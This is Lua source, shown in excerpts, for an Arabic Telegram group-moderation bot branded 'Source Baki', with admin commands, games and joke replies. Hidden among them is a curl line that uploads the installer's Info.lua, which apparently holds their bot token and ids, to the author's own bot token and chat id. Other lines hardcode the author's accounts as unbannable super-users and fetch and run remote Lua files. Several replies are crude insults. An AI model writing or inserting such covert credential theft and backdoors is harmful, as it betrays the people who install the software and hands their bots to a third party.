...
io.write('\27[0;31m\n ارسل لي توكن البوت الان ♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫ :\na♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫\n\27')
local token = io.read()
if token ~= '' then
...
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫ :\na♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫\n\27[0;33;49m')
...
io.write('\27[1;31m ♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫ ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
token = sudos.token 
--- start functions ♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫
--------------------------------------------------------------------------------------------------------------
io.popen("mkdir File_Bot") 
io.popen("cd File_Bot && rm -rf commands.lua.1") 
io.popen("cd File_Bot && rm -rf commands.lua.2") 
io.popen("cd File_Bot && rm -rf commands.lua.3") 
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Ahmed-Baki/BAKI/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,2086929677,2085634096,462002}   
...
var = true 
elseif tonumber(user_id) == tonumber(462002) then
var = true  
...
local UserName = (data.username_ or "SourceBaki")
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ")  
...
send(chat,msg.id_,"\n ♫ تم رفع الملف بنجاح وتفعيل الجروبات\n ♫ رفع {الامنشئين الاساسين ; والمنشئين ; والمدراء; والادمنيه} بنجاح")
end
...
local DRAGON_Msg = { 
' ازيك ❤️ ... \n انا بوت اسمي ('..Namebot..') \n ☆.. اعمل على حماية المجموعات من التفليش والاسبام \n ☆.. يوجد بي العديد من المميزات \n ☆.. لتفعيلي يرجى اتباع الخطوات الاتية : \n ツ.. اضف البوت الى المجموعة \n ツ.. ارفع البوت ادمن في المجموعة \n ❬وارسل تفعيل وسيتم تفعيل البوت ورفع مشرفي الكروب تلقائين)',
} 
...
send(msg.chat_id_, msg.id_,' ♫ ا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n ♫ ترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if DevSoFi(msg) then
...
local Text = ' ♫م ارسال الملصق من ♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫\n - '..Name
...
local Text = ' ❤️.. اهلا بمطوري الغالي \n ☆.. انا اسمي ('..Namebot..') \n ☆.. كل المميزات الحصريه من سورس باكي هتلاقيها عندك تلقائي \n [تابع كل جديد وحديث من هنا](t.me/SourceBaki)'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName}}, 
{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
...
send(msg.chat_id_, msg.id_,' ♫اصدار سورس باكي{ 3x☆}')
end
...
local Text = [[ 
[قناه سورس باكي ادخل وتابع الجديد](t.me/SourceBaki)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/SourceBaki)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس', url="t.me/SourceBaki"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,' ♫عدد المشتركين الان  ⇇( '..#pv..' )\n ♫♫م ازالة  ⇇( '..sendok..' ) من المشتركين\n ♫ ♫لان عدد المشتركين الحقيقي  ⇇( '..ok..' ) مشترك \n')   
end
end
end,nil)
end,nil)
...
send(msg.chat_id_, msg.id_,'• اهلا بك عزيزي ♫•\n• لايمكنك استخدام البوت ♫♫\n• عليك الاشتراك في القناة ♫ ♫n• اشترك اولا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
...
send(msg.chat_id_, msg.id_,' ♫البوت ادمن في القناة \n ♫♫م تفعيل الاشتراك الاجباري في \n ♫ ♫دي القناة ('..data.id_..')\n ♫ م♫ف القناة ([@'..data.type_.channel_.username_..'])')
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "باكي")
...
send(msg.chat_id_,0," ♫الـعـضو  : {["..data.first_name_.."](T.ME/SourceBaki)}\n ♫♫"..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
local curl = 'curl "'..'https://api.telegram.org/bot2100884218:AAHpGuqR5Tqk3sJR8BfPWPQKnuT5l5wVgxc/sendDocument'..'" -F "chat_id='.. 2085634096 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
--------------------------------------------------------------------------------------------------------------
...
send(msg.chat_id_,0, " ♫عذرا  ⇇{["..data.first_name_.."](T.ME/SourceBaki)}\n ♫♫ذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
send(msg.chat_id_, msg.id_,' ♫ا تستطيع استخدام البوت \n ♫♫رجى الاشتراك بالقناه اولا \n ♫ ♫ترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ♫ذرا يرجى ترقيه البوت مشرف !')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevSoFi(msg) then
send(msg.chat_id_, msg.id_,' ♫دد اعضاء الجروب قليله يرجى جمع >> {'..(database:get(bot_id..'Num:Add:Bot') or 0)..'} عضو')
return false
end
...
sendText(msg.chat_id_,'\n ♫مـن قبـل ↭ ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n ♫♫ـم تـعـطيل الـبوت   {'..chat.title_..'}',msg.id_/2097152/0.5,'md')
...
if database:sismember(bot_id..'Chek:Groups',msg.chat_id_) then
send(msg.chat_id_, msg.id_,' ♫ـم تـشغـيل الـبوت فـي الـجـروب ')
else
sendText(msg.chat_id_,'\n ♫مـن قبـل ↭ ['..string.sub(result.first_name_,0, 70)..'](tg://user?id='..result.id_..')\n ♫♫م تـشغـيل الـبوت فـي الـجـروب  {'..chat.title_..'}\n  وتم تــرقــيه جــمــيع الـادمــنــيه',msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'Chek:Groups',msg.chat_id_)  
...
send(msg.chat_id_, msg.id_, " ♫عزيزي >>["..mrsofi2.username_.."](https://t.me/"..(mrsofi2.username_ or "SourceBaki")..")\n ♫♫ليك وضع التوحيد ⪼ {"..database:get(bot_id.."DRAGON:teh"..msg.chat_id_).."} بجانب اسمك\n ♫ ♫د المحاولات المتبقيه {"..(tonumber(mrsofi_nnn) - tonumber(mrsofi_nnn2)).."}")
end
end
end
end
...
keyboard.inline_keyboard = {  
{{text = ' ツبہقہدونہسہ', url="https://t.me/Baki_Owner"}},  
{{text = ' 𝐵𝐴𝑅 𝐵𝐴𝐾𝐼 ',url="https://t.me/TWLbaki_Bot"}},
{{text = 'فــواصــل🌿❤️',url="https://t.me/mokfhr"}},
{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝙱𝙰𝙺𝙸', url="https://t.me/SourceBaki"}},  
}  
local msg_id = msg.id_/2097152/0.5
...
local Text = [[
مطورين ومبرمجين سورس باكي اتبع الازرار للتواصل معهم ⬇️🧿
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'بہقہدونہسہ',url="t.me/Baki_Owner"}},
...
" علامات جمال المرأة .. بختها المايل ! ",
" انك الجميع و كل من احتل قلبي🫀🤍",
"  لقد تْعَمقتُ بكَ كَثيراً والمِيمُ لام .♥️",
"  اكون اختارت غلط بس والله حبيت بجد🖇️",
...
" عَلَيَّ أَنْ أغْرَس انيابي فِي قَلْبِك لتشعر بِي ؟.",
...
local iduser = userid 
send(msg.chat_id_, msg.id_,'  ♫لايدي ⇇↝'..iduser..'↜\n ♫♫معرف ⇇↝'..username..'↜\n ♫ا♫تبه ⇇↝'..rtp..'↜\n ♫نو♫الكشف ⇇بالمعرف') 
end,nil) 
else 
send(msg.chat_id_, msg.id_,'  ♫لمعرف غير صحيح') 
end 
end 
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil) 
end
if text == '《SOURCE BAKI》 ' then
local Text = [[ 
 ♫ن أحسن السورسات على التليجرام سورس باكي ♫♫
حمايه.سرعه.دقه وامان
 قناه السورس ⬇️
  [W𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 SOURCE BAKI](http://t.me/SourceBaki)
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '《SOURCE BAKI》 ', url="t.me/SourceBaki"}}, 
...
if text == 'العاب باكي' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 ♫اهلا في قائمه الالعاب المتطوره سورس باكي ♫♫
...
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = '[《⬇️اتبع الازرار للتواصل مع》](t.me/SourceBaki)\n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ♫تم تعطيل جلب الصوره ،\n ♫♫م قفل البوتات  ،\n ♫ ♫ قفل التكرار ،\n ♫ ت♫قفل الروابط ،\n ♫ تم♫فل التوجيه ،\n ♫ تم ♫ل الملصقات ،\n ♫ تم ق♫ المتحركه ،\n ♫ تم قف♫الفيديو ،\n ♫ تم قفل♫لفشار ،\n ♫ تم قفل ♫انلاين ،\n ♫ تم قفل ت♫يل المديا ،\n ♫ تم وضع ال♫رار  ،\n ♫ تم قفل الف♫سيه  ،\n ♫ تم وضع الاي♫ بدون صوره ،n  \n ♫ تم تفعيل الح♫يه  بواسطه ، [↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜](T.ME/'..(data.username_ or 'textchuser')..')  ')
end,nil)   
end
...
if tonumber(result.sender_user_id_) == tonumber(462002) then  
send(msg.chat_id_, msg.id_, " ♫لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
function(arg,data) 
usertext = '\n ♫الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'SourceBaki')..')'
...
if result.id_ == tonumber(462002) then
send(msg.chat_id_, msg.id_, "  لا يمكنك حظر مبرمج السورس \n")
return false 
end
...
usertext = '\n ♫الـعـضو   ⇇['..result.title_..'](t.me/'..(username or 'SourceBaki')..')'
status  = '\n ♫تم حظرو عام من الجروبات '
texts = usertext..status
...
if tonumber(userid) == tonumber(462002) then  
send(msg.chat_id_, msg.id_, " ♫لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
t = ' ♫ملفات السورس باكي♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫\n ♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫ \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/Ahmed-Baki/BAKI/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ♫اهلا بك في متجر ملفات باكي\n ♫♫لفات السورس ♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
local TextE = "\n♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫\n ♫علامة تعني { ✔️ } ملف مفعل\n ♫♫لامة تعني { ✖ } ملف معطل\n ♫ ♫اة سورس باكي♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫\n".." ♫ [♫غط هنا لدخول](t.me/SourceBaki) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/Ahmed-Baki/BAKI/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ♫عذرا الملف لايدعم سورس باكي\n") 
end
return false
end
...
if text == ("مسح قائمه باكي") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ♫تم مسح قائمه باكي')
return false
end

if text == 'قائمه باكي' and Sudo(msg) then
...
if text == ("رفع باكي") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع باكي@(.*)$") and Sudo(msg) then
local username = text:match("^رفع باكي@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع باكي(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع باكي(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل باكي") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل باكي@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل باكي@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل باكي(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل باكي(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
local f = ' ♫عدد البوتات التي هي ادمن >> {'..t..'}\n ♫♫لاحضه علامة ال ( ♫)♫عني ان البوت ادمن \n'
...
if num > 1000 then 
send(msg.chat_id_, msg.id_,' ♫ستطيع التنظيف 1000 رساله كحد اقصى') 
return false  
end  
local msgm = msg.id_
for i=1,tonumber(num) do
...
send(msg.chat_id_, msg.id_," ♫م مسح ردود المتعدده")
end
------------------------------------------------------------------------
if text1 then 
...
send(msg.chat_id_, msg.id_,' ♫ا يمكنني تعديل  او وضع لقب ليس لدي صلاحيه\n ♫♫ بترقيتي جميع الصلاحيات او صلاحية اضافه مشرف ') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ♫الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..') '
...
send(msg.chat_id_, msg.id_,' ♫ينك وين القب ') 
else
send(msg.chat_id_, msg.id_,' ♫قبك هو : '..GeId.result.custom_title) 
end
end
...
send(msg.chat_id_, msg.id_,'\n ♫لاحيات البوت هي\n♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫\n ♫♫علامة ال {✔️} تعني مفعل\n ♫ ♫لامة ال {✖} تعني غير مفعل\n♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫\n ♫تغ♫ معلومات المجموعة ↞ '..INf..'\n ♫مسح♫لرسائل ↞ '..DEL..'\n ♫حظر ♫مستخدمين ↞ '..REs..'\n ♫دعوة ♫مستخدمين ↞ '..INv..'\n ♫ثتبيت ♫رسالة ↞ '..Pin..'\n ♫اضافة م♫فين ↞ '..PRo)   
end
end
...
end --الكود حصري سورس باكييعني لو بكتهن راح اعرفك انت الاخذتهن
local t = "\n ♫لمستخدم ~ ["..User_id .."] يصيح المشرفين \n♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫\n"
k = 0
...
return send(msg.chat_id_, msg.id_," ♫رسل الرد الذي اريد اضافته")
end
...
return send(msg.chat_id_, msg.id_," ♫رسل الان الكلمه لمسحها ")
end
if text then  
...
send(msg.chat_id_, msg.id_," ♫م حفظ الرد الاول ارسل الرد الثاني")
return false  
end  
end
if text then  
...
send(msg.chat_id_, msg.id_," ♫م حفظ الرد الثاني ارسل الرد الثالث")
return false  
end  
end
if text then  
...
send(msg.chat_id_, msg.id_," ♫م حفظ الرد")
return false  
end  
end
if text then
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'باكي').." غادر" or text == 'غادر' then  
...
if text == 'باكي' or text == 'بہقہدونہسہ' or text == 'بقدونس' then
local Text = [[  
♫ مــبـرمج الســورس  ♫
]]  
keyboard = {}   
...
keyboard = {}   
keyboard.inline_keyboard = {  
{{text = 'مہكہفہهر',url="t.me/ke_shahd"}},  
}  
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/ke_shahd&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == '♫━━━❲☆ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐴𝐾𝐼 ☆❳━━━♫' then 
local Text = [[  
 [قناه سورس باكي ادخل وتابع الجديد](t.me/SourceBaki) 
]]  
keyboard = {}   
keyboard.inline_keyboard = {  
{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐁𝐀𝐊𝐈',url="t.me/SourceBaki"}},  
{{text = 'TWL',url="t.me/TWLbaki_Bot"}},  
}  
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SourceBaki&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
keyboard = {}   
keyboard.inline_keyboard = {  
{{text = 'فہوزيہ',url="t.me/Q_llk"}},  
}  
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Q_llk&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𓌹ツبہقہدونہسہ  𓌺',url="t.me/Baki_Owner"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
send(msg.chat_id_, msg.id_," ♫ ـتم تـفعـيل انا مين") 
return false  
end
end
...
send(msg.chat_id_,msg.id_, '[نت مطوري تاج راسي 😊](t.me/SourceBaki)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/SourceBaki)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/SourceBaki)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/SourceBaki)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/SourceBaki)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/SourceBaki)')
return false
end
...
local my_ph = database:get(bot_id.."my_anamen:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_," نا مين معطله") 
return false  
end
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/SourceBaki)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/SourceBaki)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/SourceBaki)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد عضو قمر وبحبك 😊](t.me/SourceBaki)')
return false
end
...
send(msg.chat_id_, msg.id_," ♫ـم تـفعـيل ردود السورس") 
return false  
end
end
...
send(msg.chat_id_,msg.id_, '[ف ستين داهيه..😹💔🎶](t.me/SourceBaki)')
return false
end
...
send(msg.chat_id_,msg.id_, '[باي..😺💜](t.me/SourceBaki)')
return false
end
...
send(msg.chat_id_,msg.id_, '[وامك يبنلبوه..](t.me/SourceBaki)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[خرا عليك انت](t.me/SourceBaki)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[محدش طلب رايك](t.me/SourceBaki)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[قلبي فجيب خالك](t.me/SourceBaki)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ ..🙂 هو كل حاجه انا اللي اعملها متععمله طرد انت](t.me/SourceBaki)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك..♫♥️](t.me/SourceBaki)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر..♥️🦋](t.me/SourceBaki)')
return false
end
...
send(msg.chat_id_,msg.id_, '[عايز محح مليش دعوه 🥺💛](t.me/SourceBaki)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف...🥺💔](t.me/SourceBaki)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب..😥](t.me/SourceBaki)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ونجيب اشخاص ...😂😜](t.me/SourceBaki)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بـعشـقق .🥰❤️](t.me/SourceBaki)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[خخخ امال ..😹](t.me/SourceBaki)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[قامد قموده ..🌝♥️](t.me/SourceBaki)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انا اجمد ..💕](t.me/SourceBaki)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هروح ..😹👻](t.me/SourceBaki)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش بدودو ..😹👻](t.me/SourceBaki)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[طظ فيك ..😹👻](t.me/SourceBaki)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[الود كبر وبقي عندو بنت ..😻💥](t.me/SourceBaki)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عندو كام سنه ..😹💥](t.me/SourceBaki)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[تدوم الضحكه يقلبي ..😹💥](t.me/SourceBaki)')
return false
end
end
end
...
if text == 'مسح الميتين' and Mod(msg) then
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ♫ تم تنزيل جميع الاموات')
end
if text == ("تاك للميتنين") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n ♫ قائمة الميتنين \n•♫•♬•𝐼𝒟𝒦ⱽᴵᴾ•♬•♫•\n"
...
---------
if text == ("اشخرله") and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
  if AddChannel(msg.sender_user_id_) == false then
  local textchuser = database:get(bot_id..'text:ch:user')
  if textchuser then
  send(msg.chat_id_, msg.id_,'['..textchuser..']')
  ...
  if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
  send(msg.chat_id_, msg.id_,' ◉ تم تعطيل الشخير') 
  return false
  end
  function start_function(extra, result, success)
  database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'وسع كدا حاسب كدا ', url="t.me/SourceBaki"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/addbaki/8&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'كسمك ' or text == 'كتفمك' then
local Text = [[
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' وامك يبنال100ناقه ', url="t.me/SourceBaki"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/addbaki/9&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'طرطر ' or text == 'شخ' then
local Text = [[
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' فسسسسسسسسسسسسسسسسسسس ', url="t.me/SourceBaki"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/addbaki/10&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'يلا عراك', url="t.me/SourceBaki"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/addbaki/7&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'خلاص مات وادي جنازته', url="t.me/SourceBaki"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/addbaki/6&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'تف' then
local Text = [[
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'تفووو', url="t.me/SourceBaki"}},
}
local msg_id = msg.id_/2097152/0.5
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'طبلي ونا ارقص', url="t.me/SourceBaki"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/addbaki/5&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'بخ' then
local Text = [[
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'يوه خدتني اجدع', url="t.me/SourceBaki"}},
}
local msg_id = msg.id_/2097152/0.5
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'انفجر نيهاهاهاها', url="t.me/SourceBaki"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/addbaki/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'تخ' then
local Text = [[
]]
...
if not my_ph then
send(msg.chat_id_, msg.id_," ♫كتب تفعيل نسبه جمالي") 
return false  
end
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," ♫سبه جمالك هيا ⇜ %"..result.total_count_.." يختي قمر يجدعان ♫♫", msg.id_, msg.id_, "md")
else
send(msg.chat_id_, msg.id_,'لا تمتلك صوره في حسابك', 1, 'md')
  end end
